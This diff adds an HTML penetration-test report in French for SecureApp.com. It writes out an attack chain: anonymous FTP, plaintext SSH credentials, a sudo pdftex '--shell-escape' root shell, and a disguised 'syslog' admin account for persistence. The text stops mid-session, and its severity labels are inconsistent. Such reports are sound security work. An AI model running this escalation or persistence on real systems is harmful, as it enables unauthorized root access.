@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="fr">
+   <head>
+      <title>Rapport de Test d'Intrusion</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <style>
+         /* Style principal avec fond sombre et texte clair */
+         body {
+         font-family: 'Helvetica Neue', Helvetica, 'Segoe UI', Arial, sans-serif;
+         font-size: 16px;
+         line-height: 1.6;
+         color: #e2e8f0; /* Texte principal clair */
+         background-color: #111827; /* Fond sombre */
+         margin: 0;
+         padding: 20px;
+         }
+         /* Titres avec couleur plus claire */
+         h1, h2, h3, h4, h5, h6 {
+         color: #f8fafc; /* Blanc cassé */
+         line-height: 1.2;
+         margin-top: 1em;
+         margin-bottom: 16px;
+         }
+         h1 {
+         font-size: 2.25em;
+         font-weight: 300;
+         padding-bottom: .3em;
+         border-bottom: 1px solid #4b5563;
+         }
+         h2 {
+         font-size: 1.75em;
+         font-weight: 400;
+         padding-bottom: .3em;
+         border-bottom: 1px solid #4b5563;
+         }
+         h3 {
+         font-size: 1.5em;
+         font-weight: 500;
+         }
+         /* Liens avec couleur contrastée */
+         a {
+         color: #93c5fd; /* Bleu clair */
+         text-decoration: none;
+         }
+         a:hover {
+         color: #60a5fa; /* Bleu moyen au survol */
+         text-decoration: underline;
+         }
+         /* Tables */
+         table {
+         margin: 10px 0 15px 0;
+         border-collapse: collapse;
+         border-spacing: 0;
+         display: block;
+         width: 100%;
+         overflow: auto;
+         word-break: normal;
+         word-break: keep-all;
+         }
+         table th {
+         font-weight: 700;
+         color: #f8fafc; /* Blanc cassé */
+         background-color: #1e293b; /* Arrière-plan légèrement plus clair */
+         }
+         table td, table th {
+         border: 1px solid #4b5563;
+         padding: 6px 13px;
+         }
+         table tr:nth-child(even) {
+         background-color: #1f2937; /* Alternance de couleurs subtile */
+         }
+         /* Listes */
+         ul, ol {
+         padding-left: 2em;
+         margin-bottom: 16px;
+         }
+         /* Code et blocs de code */
+         code {
+         font-family: Menlo, Monaco, Consolas, 'Courier New', monospace;
+         font-size: .85em;
+         color: #f8fafc;
+         background-color: #1e293b;
+         border-radius: 3px;
+         padding: .2em .4em;
+         }
+         pre {
+         padding: 1em;
+         overflow: auto;
+         line-height: 1.45;
+         border: 1px solid #4b5563;
+         border-radius: 3px;
+         background-color: #1e293b;
+         margin-bottom: 16px;
+         }
+         pre code {
+         background-color: transparent;
+         padding: 0;
+         }
+         /* Citations */
+         blockquote {
+         margin: 16px 0;
+         padding: 0 15px;
+         color: #cbd5e1;
+         background-color: #1e293b;
+         border-left: 4px solid #4b5563;
+         }
+         /* Ligne horizontale */
+         hr {
+         height: 4px;
+         margin: 32px 0;
+         background-color: #4b5563;
+         border: 0 none;
+         }
+         /* Images */
+         img {
+         max-width: 100%;
+         border: 1px solid #4b5563;
+         border-radius: 5px;
+         }
+         /* Mise en page générale */
+         .markdown-preview {
+         width: 100%;
+         max-width: 100%;
+         margin: 0 auto;
+         padding: 20px;
+         }
+         /* Style pour les alertes */
+         .alert {
+         padding: 15px;
+         margin-bottom: 20px;
+         border-radius: 4px;
+         }
+         .alert-high {
+         background-color: rgba(220, 38, 38, 0.2);
+         border-left: 4px solid #dc2626;
+         }
+         .alert-medium {
+         background-color: rgba(245, 158, 11, 0.2);
+         border-left: 4px solid #f59e0b;
+         }
+         .alert-low {
+         background-color: rgba(16, 185, 129, 0.2);
+         border-left: 4px solid #10b981;
+         }
+         .severity-badge {
+         display: inline-block;
+         padding: 3px 8px;
+         border-radius: 3px;
+         font-size: 0.8em;
+         font-weight: bold;
+         }
+         .severity-high {
+         background-color: #dc2626;
+         color: white;
+         }
+         .severity-medium {
+         background-color: #f59e0b;
+         color: white;
+         }
+         .severity-low {
+         background-color: #10b981;
+         color: white;
+         }
+         .severity-critical {
+         background-color: #7f1d1d;
+         color: white;
+         }
+         /* Style pour les critères CVSS */
+         .cvss-metrics {
+         display: grid;
+         grid-template-columns: 1fr 1fr;
+         gap: 10px;
+         margin-bottom: 20px;
+         }
+         .cvss-metric {
+         background-color: #1e293b;
+         padding: 10px;
+         border-radius: 5px;
+         }
+         .cvss-metric h4 {
+         margin-top: 0;
+         margin-bottom: 5px;
+         color: #93c5fd;
+         }
+         /* Style pour la section TL;DR */
+         .tldr-section {
+         background-color: #1e293b;
+         border-left: 4px solid #60a5fa;
+         padding: 15px;
+         margin: 20px 0;
+         border-radius: 0 4px 4px 0;
+         }
+         .tldr-section h3 {
+         color: #93c5fd;
+         margin-top: 0;
+         }
+      </style>
+   </head>
+   <body>
+      <div class="markdown-preview">
+         <h1 id="rapport-de-test-dintrusion">Rapport de Test d'Intrusion</h1>
+         <h2 id="client">SecureApp.com</h2>
+         <table>
+            <thead>
+               <tr>
+                  <th>Propriété</th>
+                  <th>Valeur</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td><strong>Référence:</strong></td>
+                  <td>2025-SEC023</td>
+               </tr>
+               <tr>
+                  <td><strong>Préparé par:</strong></td>
+                  <td>Clemence Chopin</td>
+               </tr>
+               <tr>
+                  <td><strong>Version du document:</strong></td>
+                  <td>1.1</td>
+               </tr>
+               <tr>
+                  <td><strong>Date:</strong></td>
+                  <td>08/05/2025</td>
+               </tr>
+               <tr>
+                  <td><strong>Type:</strong></td>
+                  <td>Audit de sécurité technique (pentest)</td>
+               </tr>
+               <tr>
+                  <td><strong>Durée:</strong></td>
+                  <td>2 heures</td>
+               </tr>
+               <tr>
+                  <td><strong>Lieu:</strong></td>
+                  <td>Audit en ligne</td>
+               </tr>
+               <tr>
+                  <td><strong>Contact:</strong></td>
+                  <td>contact@secureapp.com</td>
+               </tr>
+               <tr>
+                  <td><strong>Classification:</strong></td>
+                  <td>Confidentiel</td>
+               </tr>
+               <tr>
+                  <td><strong>Cible:</strong></td>
+                  <td>https://secureapp.com, IP: 10.39.40.5</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="historique-des-modifications">Historique des modifications</h2>
+         <table>
+            <thead>
+               <tr>
+                  <th>Version</th>
+                  <th>Date</th>
+                  <th>Description</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>V1.0</td>
+                  <td>08/05/2025</td>
+                  <td>Publication initiale</td>
+               </tr>
+               <tr>
+                  <td>V1.1</td>
+                  <td>12/05/2025</td>
+                  <td>Enrichissement avec analyse GTFOBins, scans de vulnérabilités, tests Metasploit et recommandations de formation</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="sommaire">Sommaire</h2>
+         <ol>
+            <li><a href="#résumé-exécutif">Résumé Exécutif</a></li>
+            <li><a href="#tldr-recap">TL;DR - Récapitulatif et Actions Clés</a></li>
+            <li><a href="#contexte-et-cadre">Contexte et Cadre du Test d'Intrusion</a></li>
+            <li><a href="#méthodologie">Méthodologie Technique et Évaluation</a></li>
+            <li><a href="#périmètre-technique">Périmètre Technique</a></li>
+            <li><a href="#participants">Participants</a></li>
+            <li><a href="#sommaire-vulnérabilités">Sommaire des Vulnérabilités et Recommandations</a></li>
+            <li><a href="#analyse-risque">Analyse du Risque Global</a></li>
+            <li><a href="#détails-vulnérabilités">Détails des Vulnérabilités</a></li>
+            <li><a href="#analyse-avancee">Analyse Avancée et Techniques d'Exploitation</a></li>
+            <li><a href="#formation-utilisateur">Recommandations de Formation Utilisateur</a></li>
+            <li><a href="#annexes">Annexes</a></li>
+         </ol>
+         <hr>
+         <h2 id="résumé-exécutif">Résumé Exécutif</h2>
+         <p>Ce rapport présente les résultats d'un test d'intrusion ciblé réalisé sur le serveur applicatif de l'entreprise SecureApp, ayant pour ip 10.39.40.5.
+            L'objectif était d'identifier les vulnérabilités potentielles et d'évaluer le niveau de sécurité global du serveur.</p>
+         <p>Au cours de ce test, nous avons découvert 3 vulnérabilités qui peuvent compromettre la sécurité du serveur et de ses utilisateurs :</p>
+         <table>
+            <thead>
+               <tr>
+                  <th>Vulnérabilité</th>
+                  <th>Sévérité</th>
+                  <th>Impact Principal</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td><strong>CWE-284: Improper Access Control</strong></td>
+                  <td><span class="severity-badge severity-high">CVSS v3.1 Score: 7.5 / High</span></td>
+                  <td>Accès à des fichiers confidentiels</td>
+               </tr>
+               <tr>
+                  <td><strong>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</strong></td>
+                  <td><span class="severity-badge severity-high">CVSS v3.1 Score: 7.5 / High</span></td>
+                  <td>Fichier contenant des données sensibles accessibles</td>
+               </tr>
+               <tr>
+                  <td><strong>CWE-78: Improper Neutralization of Special Elements used in an OS Command</strong></td>
+                  <td><span class="severity-badge severity-critical">CVSS v3.1 Score: 9.6 / Critical</span></td>
+                  <td>Possibilité d'executer des commandes shells en utilisant des characteres speciaux</td>
+               </tr>
+            </tbody>
+         </table>
+         <p>Ces vulnérabilités représentent un risque significatif pour l'intégrité des données, et le maintient en condition opérationnel du serveur. Nous recommandons vivement de mettre en œuvre les correctifs proposés dans ce rapport dans les plus brefs délais.</p>
+         <hr>
+         
+         <!-- Nouvelle section TL;DR -->
+         <h2 id="tldr-recap">TL;DR - L'essentiel à retenir</h2>
+         <div class="tldr-section">
+            <h3>En bref :</h3>
+            <ol>
+               <li>FTP anonyme → vol d'identifiants → authentification SSH</li>
+               <li>Identification de privilèges sudo sur pdftex</li>
+               <li>Exploitation de pdftex via GTFOBins → accès root (CRITIQUE, CVSS: 9.6)</li>
+            </ol>
+            
+            <h3>Remédiations essentielles :</h3>
+            <ol>
+               <li><strong>Accès FTP :</strong> Désactiver l'accès anonyme au FTP immédiatement (<code>anonymous_enable=NO</code> dans vsftpd.conf)</li>
+               <li><strong>Gestion des mots de passe :</strong> Ne JAMAIS stocker de mots de passe en clair. Utiliser un gestionnaire de mots de passe d'entreprise (KeePass, Bitwarden)</li>
+               <li><strong>Configuration sudo :</strong> Restreindre les permissions sudo en utilisant le principe du moindre privilège et des contraintes sur les commandes (<code>alice ALL=(ALL:ALL) NOPASSWD: /usr/bin/pdftex, !/usr/bin/pdftex *--shell-escape*</code>)</li>
+               <li><strong>Mises à jour :</strong> Maintenir systématiquement à jour tous les logiciels avec les derniers correctifs de sécurité</li>
+            </ol>
+            
+            <h3>Bonnes pratiques à adopter :</h3>
+            <ol>
+               <li>Utiliser un outil de scan de vulnérabilités régulièrement (OpenVAS, Nessus) pour identifier les services vulnérables</li>
+               <li>Consulter GTFOBins avant d'accorder des droits sudo à un programme spécifique</li>
+               <li>Former les utilisateurs aux risques liés à la gestion des mots de passe (utiliser des mots de passe forts, uniques, et un gestionnaire)</li>
+               <li>Mettre en place un processus de vérification régulière des droits sudo/SUID dans le système</li>
+            </ol>
+         </div>
+         <hr>
+         
+         <h2 id="contexte-et-cadre">Contexte et Cadre du Test d'Intrusion</h2>
+         <p>Clémence Chopin (Secure Testing) a été invité à réaliser un audit de sécurité technique pour SecureApp.com, suite à une mise à jour majeure de la plateforme et avant son déploiement en production.</p>
+         <h3>Objectifs</h3>
+         <p>Les objectifs principaux de ce test d'intrusion étaient les suivants :</p>
+         <ul>
+            <li>Identifier les vulnérabilités potentielles sur le serveur.</li>
+            <li>Évaluer l'efficacité des mécanismes de sécurité en place</li>
+            <li>Déterminer l'impact potentiel de chaque vulnérabilité découverte</li>
+            <li>Fournir des recommandations pour renforcer la posture de sécurité</li>
+         </ul>
+         <h3>Limitations</h3>
+         <p>Les limitations suivantes ont été appliquées lors du test :</p>
+         <ul>
+            <li>Aucune attaque de type déni de service (DoS) n'a été réalisée</li>
+            <li>Les tests ont été effectués dans un environnement contrôlé</li>
+            <li>Les tests d'ingénierie sociale n'ont pas été inclus dans le périmètre</li>
+         </ul>
+         <hr>
+         <h2 id="méthodologie">Méthodologie Technique et Évaluation</h2>
+         <p>Le tableau suivant récapitule les niveaux de criticité basés sur le <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">Common Vulnerability Scoring System</a> (CVSS) version 3.1.</p>
+         <table>
+            <thead>
+               <tr>
+                  <th>Niveau</th>
+                  <th>Score CVSS</th>
+                  <th>Description</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td><strong>Critique</strong></td>
+                  <td>9-10</td>
+                  <td>Les vulnérabilités de niveau critique sont exploitables à distance (grande portée) et/ou sans conditions particulières d'accès et/ou sans authentification. Elles peuvent compromettre rapidement et facilement le système ciblé, voire les données utilisateurs. Elles doivent être traitées de façon urgente et prioritaire.</td>
+               </tr>
+               <tr>
+                  <td><strong>Élevé</strong></td>
+                  <td>7-8.9</td>
+                  <td>Les vulnérabilités de niveau élevé ont un impact important sur le système ciblé et/ou peuvent être exploitées à distance et/ou sans authentification.</td>
+               </tr>
+               <tr>
+                  <td><strong>Moyen</strong></td>
+                  <td>4-6.9</td>
+                  <td>Les vulnérabilités de niveau moyen n'ont qu'une portée ou un impact réduit. L'exploitation requiert par exemple une authentification.</td>
+               </tr>
+               <tr>
+                  <td><strong>Bas</strong></td>
+                  <td>0.1-3.9</td>
+                  <td>Les vulnérabilités de niveau bas sont sans effet ou presque sur le système visé.</td>
+               </tr>
+               <tr>
+                  <td><strong>Nul</strong></td>
+                  <td>0</td>
+                  <td>Les vulnérabilités de niveau nul n'ont aucun impact sur le système visé.</td>
+               </tr>
+               <tr>
+                  <td><strong>Info</strong></td>
+                  <td>-</td>
+                  <td>Information donnée au sujet d'une vulnérabilité ou d'un système</td>
+               </tr>
+            </tbody>
+         </table>
+         <h3>Types de preuve et de correction</h3>
+         <p>Chaque vulnérabilité rapportée est fournie avec au moins un élément de preuve réplicable.</p>
+         <p>Voici quelques exemples de preuves possibles :</p>
+         <ol>
+            <li>Preuves techniques (bout de code, lien vers une page web, etc)</li>
+            <li>Preuves méthodologiques (utilisation d'outil, de méthodologies)</li>
+            <li>Preuves informelles (informations divulguées, etc)</li>
+         </ol>
+         <p>Chaque vulnérabilité rapportée est fournie avec un élément de correction (capture d'écran, preuve écrite ou lien web).</p>
+         <h3>Phases de Test</h3>
+         <p>Notre approche du test d'intrusion a suivi la méthodologie standard en six phases :</p>
+         <h4>1. Reconnaissance</h4>
+         <p>Collecte d'informations publiques sur l'entreprise et son infrastructure, analyse des DNS, recherche de sous-domaines, et identification des technologies utilisées.</p>
+         <h4>2. Scan</h4>
+         <p>Nous avons effectué un scan complet de l'infrastructure en utilisant différents outils pour identifier les services exposés, les ports ouverts et les technologies utilisées :</p>
+         <ul>
+            <li><strong>Nmap</strong> : Scan de port complet avec détection de service et de système d'exploitation</li>
+            <li><strong>Nuclei</strong> : Scan de vulnérabilités pour identifier les problèmes de sécurité connus</li>
+            <li><strong>Nikto</strong> : Scan de vulnérabilités sur les services web identifiés</li>
+         </ul>
+         <h4>3. Analyse des vulnérabilités</h4>
+         <p>Tentative de connexion aux différents services identifiés lors de la phase de scanning, et vérification dans les bases de données CVE et GTFOBins pour identifier d'éventuelles failles connues.</p>
+         <h4>4. Exploitation</h4>
+         <p>Tentatives d'exploitation des vulnérabilités identifiées avec création de preuves de concept (PoC) et évaluation de l'impact réel sur le système. Utilisation de Metasploit pour confirmer l'exploitabilité de certaines vulnérabilités.</p>
+         <h4>5. Persistance</h4>
+         <p>Nous avons pu créer un compte administrateurs sur la machine cible et ainsi s'assurer de nos futures connexions</p>
+         <h4>6. Documentation</h4>
+         <p>Documentation détaillée de toutes les découvertes, incluant les méthodes de reproduction, les preuves d'exploitation, l'analyse d'impact et les recommandations de correction.</p>
+         
+         <h4>Outils utilisés</h4>
+         <table>
+            <thead>
+               <tr>
+                  <th>Outil</th>
+                  <th>Objectif</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>Nmap</td>
+                  <td>Scan de ports et de services</td>
+               </tr>
+               <tr>
+                  <td>Metasploit Framework</td>
+                  <td>Test d'exploitation des vulnérabilités</td>
+               </tr>
+               <tr>
+                  <td>GTFOBins</td>
+                  <td>Base de données des binaires Unix pouvant être utilisés pour contourner les restrictions de sécurité</td>
+               </tr>
+               <tr>
+                  <td>Nuclei</td>
+                  <td>Scan de vulnérabilités</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="périmètre-technique">Périmètre Technique</h2>
+         <p>L'audit de sécurité a été mené sur l'environnement suivant :</p>
+         <ul>
+            <li>10.39.40.5 - Ubuntu</li>
+            <li>serveur ftp - vsftpd 3.0.3</li>
+            <li>Serveur ssh - OpenSSH 7.6p1</li>
+            <li>Système d'authentification et gestion des utilisateurs</li>
+         </ul>
+         <hr>
+         <h2 id="participants">Participants</h2>
+         <p>Les personnes suivantes ont participé au test d'intrusion :</p>
+         <table>
+            <thead>
+               <tr>
+                  <th>Nom et prénom</th>
+                  <th>E-mail</th>
+                  <th>Téléphone</th>
+                  <th>Rôle</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>Clemence Chopin</td>
+                  <td>telynor@gmail.com</td>
+                  <td>01 23 45 67 89</td>
+                  <td>Auditeur technique principal</td>
+               </tr>
+            </tbody>
+         </table>
+         <hr>
+         <h2 id="sommaire-vulnérabilités">Sommaire des Vulnérabilités trouvées et recommandations</h2>
+         <h3>Résumé de l'expertise</h3>
+         <table>
+            <thead>
+               <tr>
+                  <th>Vulnérabilité et Niveau de criticité</th>
+                  <th>Recommandations</th>
+                  <th>Actifs concernés</th>
+                  <th>Score CVSS</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>CWE-284: Improper Access Control</td>
+                  <td>Désactiver les accès anonymes sur le FTP</td>
+                  <td>serveur ftp - vsftpd 3.0.3</td>
+                  <td>7.5</td>
+               </tr>
+               <tr>
+                  <td>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</td>
+                  <td>Ne pas stocker de mot de passe dans des fichiers non sécurisés, privilégier des gestionnaires de mots de passe</td>
+                  <td> - </td>
+                  <td>7.5</td>
+               </tr>
+               <tr>
+                  <td>CWE-78: Improper Neutralization of Special Elements used in an OS Command</td>
+                  <td>Mettre à jour les logiciels d'entreprise, se tenir informé des vulnérabilités</td>
+                  <td>pdfTeX 3.14159265-2.6-1.40.18</td>
+                  <td>9.6</td>
+               </tr>
+            </tbody>
+         </table>
+         <p>Les tests effectués ont permis de dévoiler 3 vulnérabilités de niveau critique.
+            N'importe quel utilisateur sur le réseau peut accéder au FTP et obtenir des crédentials lui permettant d'interagir avec une application vulnérable et d'obtenir ainsi un accès super utilisateur. </p>
+         <hr>
+         <h2 id="analyse-risque">Analyse du Risque Global</h2>
+         <h3>Facteurs d'attaque</h3>
+         <div class="cvss-metrics">
+            <div class="cvss-metric">
+               <h4>Vecteur d'attaque</h4>
+               <p>Réseau (Network) - AV:N</p>
+               <p>Attaque qui peut être menée depuis Internet sans accès physique ou local au système</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Complexité</h4>
+               <p>Faible (Low) - AC:L</p>
+               <p>Pas d'effort ou de préparation particulière requise pour l'exploitation</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Privilèges requis</h4>
+               <p>Aucun (None) - PR:N</p>
+               <p>Pas de compte utilisateur ou d'authentification préalable nécessaire</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Interaction humaine</h4>
+               <p>Requise (Required) - UI:R</p>
+               <p>Pour certaines vulnérabilités, une interaction avec un utilisateur légitime est nécessaire</p>
+            </div>
+         </div>
+         <h3>Facteurs d'impact</h3>
+         <div class="cvss-metrics">
+            <div class="cvss-metric">
+               <h4>Périmètre</h4>
+               <p>Changé (Changed) - S:C</p>
+               <p>L'attaque peut permettre d'exploiter davantage le système au-delà du composant vulnérable</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Confidentialité</h4>
+               <p>Élevée (High) - C:H</p>
+               <p>Les données confidentielles de l'application et des utilisateurs peuvent être compromises</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Intégrité</h4>
+               <p>Élevée (High) - I:H</p>
+               <p>Les données peuvent être modifiées ou altérées de manière significative</p>
+            </div>
+            <div class="cvss-metric">
+               <h4>Disponibilité</h4>
+               <p>Élevée (High) - A:H</p>
+               <p>L'application peut être rendue indisponible ou sérieusement compromise</p>
+            </div>
+         </div>
+         <hr>
+         <h2 id="détails-vulnérabilités">Détails des Vulnérabilités</h2>
+         <!-- Vulnérabilité 1: CWE-284: Improper Access Control -->
+         <h3 id="vulnerabilite-1">CWE-284: Improper Access Control</h3>
+         <div class="alert alert-high">
+            <table>
+               <thead>
+                  <tr>
+                     <th>Propriété</th>
+                     <th>Détail</th>
+                  </tr>
+               </thead>
+               <tbody>
+                  <tr>
+                     <td><strong>Catégorie OWASP</strong></td>
+                     <td><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A01:2021-Broken Access Control</a></td>
+                  </tr>
+                  <tr>
+                     <td><strong>Sévérité</strong></td>
+                     <td>CVSS 7.5 (Élevé)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Vecteur CVSS</strong></td>
+                     <td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Service Affecté</strong></td>
+                     <td>Serveur ftp - vsftpd 3.0.3</td>
+                  </tr>
+               </tbody>
+            </table>
+         </div>
+         <h4>Description</h4>
+         <p>Cette vulnérabilité survient lorsque les contrôles d'accès sont mal configurés ou absents, permettant à des utilisateurs non autorisés d'accéder à des ressources sensibles. Un attaquant pourrait ainsi consulter des fichiers censés être restreints.</p>
+         <h4>Impact</h4>
+         <ol>
+            <li>Lecture de fichiers confidentiels</li>
+            <li>Fuite d'informations critiques</li>
+         </ol>
+         <h4>Preuve d'Exploitation</h4>
+
+         <p>Dès la phase de scan, nous sommes informés de la présence de fichiers accessibles sur le serveur FTP</p>
+         <pre><code>pentest@cyberini1:/home/pentest$ nmap -A 10.39.40.5 -p 21
+Starting Nmap 7.94 ( https://nmap.org ) at 2025-04-08 08:45 UTC
+Nmap scan report for cvqcs4us_cvqcs5eslcb111osrf60.cvqcs4uslcb111osrf50 (10.39.40.5)
+Host is up (0.00012s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0              13 Aug 27  2024 identifiants-ssh.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.39.40.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds</code></pre>
+
+         <p>Il n'est pas nécessaire de specifier de mot de passe pour se connecter au serveur FTP.</p>
+
+         <pre><code>
+ftp anonymous@10.39.40.5
+Connected to 10.39.40.5.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+         </code></pre>
+         <h4>Recommandations</h4>
+         <ol>
+            <li>
+               <strong>Désactiver les accès anonyme sur le FTP</strong>
+               <pre><code>
+[root@server ~]# vi /etc/vsftpd/vsftpd.conf
+#in the 12th line edit line any of below two (uncomment the line if commented)
+anonymous_enable=NO          #(to disable anonymous access)
+# Now save the vsftpd.conf configuration file and Restart the vsftpd daemon
+               </code></pre>
+            </li>
+            <li><strong>Audit des journaux</strong> - Vérifier les journaux pour identifier d'éventuelles tentatives d'exploitation passées</li>
+         </ol>
+         <h4>Références</h4>
+         <ul>
+            <li><a href="http://vsftpd.beasts.org/vsftpd_conf.html">vsftpd_conf</a></li>
+            <li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A01:2021-Broken Access Control</a></li>
+         </ul>
+         <hr>
+         <!-- Vulnérabilité 2: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor -->
+         <h3 id="vulnerabilite-2">CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</h3>
+         <div class="alert alert-high">
+            <table>
+               <thead>
+                  <tr>
+                     <th>Propriété</th>
+                     <th>Détail</th>
+                  </tr>
+               </thead>
+               <tbody>
+                  <tr>
+                     <td><strong>Catégorie OWASP Top 10</strong></td>
+                     <td><a href="https://owasp.org/Top10/fr/A01_2021-Broken_Access_Control/">A01:2021 – Contrôles d'accès défaillants </a></td>
+                  </tr>
+                  <tr>
+                     <td><strong>Sévérité</strong></td>
+                     <td>CVSS 7.5 (Élevée)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Vecteur CVSS</strong></td>
+                     <td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td>
+                  </tr>
+               </tbody>
+            </table>
+         </div>
+         <h4>Description</h4>
+         <p>Des identifiants SSH sont accessibles dans un fichier texte non crypté, et non protégé.</p>
+         <h4>Reproduction</h4>
+         <ol>
+            <li>Connexion en utilisateur anonyme sans mots de passe sur serveur FTP</li>
+            <li>Liste des fichiers présents sur le serveur FTP</li>
+            <li>Téléchargement du fichier texte</code></li>
+            <li>Lecture du fichier texte</li>
+         </ol>
+         <h4>Preuve d'Exploitation</h4>
+
+         <pre><code>
+ftp anonymous@10.39.40.5
+Connected to 10.39.40.5.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||49455|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0              13 Aug 27  2024 identifiants-ssh.txt
+226 Directory send OK.
+ftp> get identifiants-ssh.txt
+local: identifiants-ssh.txt remote: identifiants-ssh.txt
+229 Entering Extended Passive Mode (|||52348|)
+150 Opening BINARY mode data connection for identifiants-ssh.txt (13 bytes).
+100% |***********************************************************************|    13      178.80 KiB/s    00:00 ETA
+226 Transfer complete.
+13 bytes received in 00:00 (27.96 KiB/s)
+ftp> exit
+221 Goodbye.
+pentest@cyberini1:/home/pentest$ cat identifiants-ssh.txt
+alice:mdp456
+         </code></pre>
+
+         <h4>Impact</h4>
+         <p>Cette vulnérabilité permet d'accéder à des fichiers sensibles</p>
+         <ul>
+            <li><strong>Vol de données</strong> - Un attaquant peut voler des fichiers contenant des données sensibles</li>
+            <li><strong>Vol d'identifiant</strong> - Un attaquant peut voler des identifiants et ainsi prendre le contrôle d'autres machines dans le system d'information.</li>
+         </ul>
+         <h4>Recommandations</h4>
+         <ol>
+            <li>
+              Ne pas stocker de données sensibles sur le réseau dans des fichiers non cryptées.
+            </li>
+            <li>Sensibiliser les utilisateurs à l'importance de la confidentialité des mots de passe</li>
+            <li>
+               Mettre en place une action de changement de mot de passe.
+            </li>
+         </ol>
+         <h4>Références</h4>
+         <ul>
+            <li><a href="https://owasp.org/Top10/fr/A01_2021-Broken_Access_Control/">A01:2021 – Contrôles d'accès défaillants </a></li>
+            <li><a href="https://www.francenum.gouv.fr/guides-et-conseils/protection-contre-les-risques/cybersecurite/pourquoi-et-comment-utiliser-un">Pourquoi et comment utiliser un gestionnaire de mots de passe ?</a></li>
+            <li><a href="https://www.cnil.fr/fr/mots-de-passe-une-nouvelle-recommandation-pour-maitriser-sa-securite">Mots de passe : une nouvelle recommandation pour maîtriser sa sécurité</a></li>
+         </ul>
+         <hr>
+         <!-- Vulnérabilité 3: CWE-78: Improper Neutralization of Special Elements used in an OS Command -->
+         <h3 id="vulnerabilite-3">CWE-78: Improper Neutralization of Special Elements used in an OS Command</h3>
+         <div class="alert alert-high">
+            <table>
+               <thead>
+                  <tr>
+                     <th>Propriété</th>
+                     <th>Détail</th>
+                  </tr>
+               </thead>
+               <tbody>
+                  <tr>
+                     <td><strong>Catégorie OWASP Top 10</strong></td>
+                     <td><a href="https://owasp.org/Top10/A03_2021-Injection/">A03:2021 – Injection</a></td>
+                  </tr>
+                  <tr>
+                     <td><strong>Sévérité</strong></td>
+                     <td>CVSS 9.6 (Critique)</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Vecteur CVSS</strong></td>
+                     <td>AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H</td>
+                  </tr>
+                  <tr>
+                     <td><strong>Service Affecté</strong></td>
+                     <td>pdfTeX 3.14159265-2.6-1.40.18</td>
+                  </tr>
+               </tbody>
+            </table>
+         </div>
+         <h4>Description</h4>
+         <p>Des données externes sont utilisées sans être correctement filtrées, permettant potentiellement l'injection de commandes malveillantes et la modification du comportement attendu du système.</p>
+         <h4>Reproduction</h4>
+         <ol>
+            <li>Utiliser les identifiants trouvé sur le serveur FTP pour établir une connexion au serveur SSH</li>
+            <li>La commande sudo -l permet d'identifier un service accessible avec une élévation de privilège, pdfTeX.</li>
+            <li>Utilisation d'une faille dans ce service pour obtenir un shell administrateur sur la machine cible</code></li>
+            <li>Création d'un compte administrateur pour persister notre présence dans le system</li>
+         </ol>
+         <h4>Preuve d'Exploitation</h4>
+
+         <pre><code>
+alice@cyberini2:~$ echo "\immediate\write18{/bin/bash}
+> \bye
+> " > /tmp/exploit.txt
+alice@cyberini2:~$ sudo /usr/bin/pdftex --shell-escape /tmp/exploit.txt
+This is pdfTeX, Version 3.14159265-2.6-1.40.18 (TeX Live 2017/Debian) (preloaded format=pdftex)
+ \write18 enabled.
+entering extended mode
+(/tmp/exploit.txtroot@cyberini2:/home/alice# whoami
+root
+root@cyberini2:/home/alice#
+
+root@cyberini2:/home/alice# adduser syslog
+Adding user syslog' ...
+Adding new group syslog' (1001) ...
+Adding new user syslog' (1001) with group syslog' ...
+Creating home directory /home/syslog' ...
+Copying files from /etc/skel' ...
+Enter new UNIX password:
